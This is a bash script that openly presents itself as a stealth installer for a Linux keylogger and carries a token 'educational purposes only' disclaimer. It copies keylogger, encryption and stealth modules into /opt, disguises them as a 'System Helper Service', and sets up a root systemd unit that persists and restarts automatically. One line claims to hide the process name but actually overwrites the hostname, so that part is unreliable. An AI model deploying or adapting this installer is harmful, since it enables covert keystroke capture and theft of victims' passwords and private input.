#!/bin/bash

# Linux Keylogger Stealth Installer
# WARNING: For educational purposes only. Unauthorized use is illegal.

# Ensure script is run with sudo
if [[ $EUID -ne 0 ]]; then
   echo "This script must be run with sudo" 
   exit 1
fi

# Configuration
INSTALL_DIR="/opt/system_helper"
KEYLOGGER_NAME="system_helper"
SERVICE_NAME="system-helper.service"

# Create installation directory
mkdir -p "$INSTALL_DIR"

# Copy keylogger files
cp ../Backend/keylogger.py "$INSTALL_DIR/$KEYLOGGER_NAME"
cp ../Backend/encrypt.py "$INSTALL_DIR/encrypt.py"
cp ../Backend/stealth.py "$INSTALL_DIR/stealth.py"

# Set permissions
chmod 600 "$INSTALL_DIR/$KEYLOGGER_NAME"
chmod 600 "$INSTALL_DIR/encrypt.py"
chmod 600 "$INSTALL_DIR/stealth.py"

# Create systemd service for persistence
SERVICE_PATH="/etc/systemd/system/$SERVICE_NAME"
cat > "$SERVICE_PATH" << EOL
[Unit]
Description=System Helper Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 $INSTALL_DIR/$KEYLOGGER_NAME
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOL

# Set service permissions
chmod 644 "$SERVICE_PATH"

# Enable and start the service
systemctl daemon-reload
systemctl enable "$SERVICE_NAME"
systemctl start "$SERVICE_NAME"

# Optional: Hide process name via /proc
echo "system_helper" > /proc/sys/kernel/hostname

echo "Keylogger installed successfully in stealth mode."
echo "WARNING: Unauthorized use is strictly prohibited." 